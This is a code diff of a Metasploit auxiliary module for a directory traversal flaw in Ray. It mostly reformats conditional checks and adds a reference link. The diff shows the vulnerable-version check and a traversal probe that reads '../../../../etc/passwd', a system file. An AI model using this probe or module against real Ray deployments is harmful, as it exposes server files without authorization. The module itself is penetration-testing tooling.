@@ -21,7 +21,8 @@ class MetasploitModule < Msf::Auxiliary
         'Author' => ['Richard Howe <rhowe425>'],
         'License' => MSF_LICENSE,
         'References' => [
-          ['URL', 'https://github.com/ray-project/ray/pull/64701']
+          ['URL', 'https://github.com/ray-project/ray/pull/64701'],
+          ['URL', 'https://github.com/ray-project/ray/issues/39701']
         ],
         'DisclosureDate' => '2026-07-15',
         'Notes' => {
@@ -57,19 +58,25 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, 'api/version')
     })
 
-    return Exploit::CheckCode::Unknown(
-      'No response or unexpected status from Ray API'
-    ) unless res && res.code == 200
+    unless res && res.code == 200
+      return Exploit::CheckCode::Unknown(
+        'No response or unexpected status from Ray API'
+      )
+    end
 
     ray_version = res.get_json_document['ray_version']
 
-    return Exploit::CheckCode::Unknown(
-      'Could not determine Ray version'
-    ) unless ray_version
+    unless ray_version
+      return Exploit::CheckCode::Unknown(
+        'Could not determine Ray version'
+      )
+    end
 
-    return Exploit::CheckCode::Safe(
-      "Ray version #{ray_version} is not vulnerable"
-    ) unless Rex::Version.new(ray_version) <= Rex::Version.new('2.56.0')
+    unless Rex::Version.new(ray_version) <= Rex::Version.new('2.56.0')
+      return Exploit::CheckCode::Safe(
+        "Ray version #{ray_version} is not vulnerable"
+      )
+    end
 
     entries = enumerate_files('../../../../etc/passwd')
 
@@ -119,10 +126,9 @@ class MetasploitModule < Msf::Auxiliary
   def run
     entries = enumerate_files(datastore['FILE_PATH'])
 
-    fail_with(
-      Failure::Unknown,
-      'Failed to enumerate filesystem entries'
-    ) unless entries
+    unless entries
+      fail_with(Failure::Unknown, 'Failed to enumerate filesystem entries')
+    end
 
     print_good('Filesystem entries found:')
 
